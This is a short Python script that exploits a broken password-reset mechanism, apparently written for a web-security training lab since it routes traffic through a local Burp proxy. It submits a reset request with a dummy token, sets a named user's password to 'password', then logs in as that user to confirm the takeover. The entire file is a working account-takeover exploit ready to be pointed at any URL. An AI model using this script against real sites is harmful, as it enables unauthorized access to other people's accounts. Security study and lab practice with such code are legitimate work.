import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def changePass(url, user, s):
    print(f"Modifying {user} account")
    u = url + "forgot-password?temp-forgot-password-token=x"
    data = {'temp-forgot-password-token':'x', 'username':f'{user}', "new-password-1": "password", "new-password-2": "password"}
    r = s.post(u, data=data, verify=False, proxies=proxies)
    print(f"Logging in as {user}")
    u2 = url + "login"
    data2 = {'username':f'{user}', 'password':'password'}
    r2 = s.post(u2, data=data2, verify=False, proxies=proxies)
    if "Log out" in r2.text:
        print("Success!")
    else:
        print("Failed")
        sys.exit(-1)
    

def main():
    try:
        url = sys.argv[1]
        user = sys.argv[2]
        s = requests.Session()
        changePass(url, user, s)
    except IndexError:
        print("Usage: %s <url> <becomeUser>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
